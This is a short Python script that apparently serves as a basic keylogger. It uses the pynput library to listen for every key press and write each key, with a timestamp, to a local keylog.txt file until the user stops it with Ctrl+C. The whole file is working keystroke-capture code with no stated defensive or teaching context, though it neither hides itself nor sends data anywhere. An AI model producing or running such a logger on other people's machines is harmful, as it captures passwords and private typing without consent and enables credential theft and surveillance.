from pynput import keyboard
import time

def format_key(key):
    """Format the key for readability."""
    try:
        if key.char:
            return key.char
    except AttributeError:
        return str(key).replace('Key.', '').capitalize()

def on_key_press(key):
    """Handle the key press event."""
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    formatted_key = format_key(key)
    
    with open("keylog.txt", "a") as log_file:
        log_file.write(f"{timestamp} - {formatted_key}\n")

def main():
    """Main function to start the keylogger."""
    print("Press Ctrl+C to stop logging.")
    with keyboard.Listener(on_press=on_key_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
